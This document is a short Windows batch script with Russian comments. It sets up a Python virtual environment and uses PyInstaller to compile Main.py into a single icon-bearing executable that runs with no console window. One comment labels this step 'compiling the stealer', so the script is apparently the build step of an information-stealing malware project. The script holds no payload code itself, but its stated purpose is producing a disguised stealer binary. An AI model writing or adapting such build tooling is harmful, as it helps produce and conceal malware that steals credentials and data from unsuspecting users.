@echo off

rem Создание окружение
python -m venv .hpv_venv

rem Активация окружения
call .hpv_venv\Scripts\activate

rem Установка зависимостей из HPV_Requirements.txt
pip install -r Requirements.txt

rem Компиляция стиллера
for /f "delims=" %%i in ('python -c "import Config; print(Config.NAME)"') do set BUILDNAME=%%i
pyinstaller -i Ico.ico --clean --onefile --name %BUILDNAME% --noconsole Main.py

rem Удаление ненужного
rmdir /s /q build
rmdir /s /q __pycache__
del %BUILDNAME%.spec
move dist "Result"

rem Ожидание нажатия клавиши для закрытия окна
pause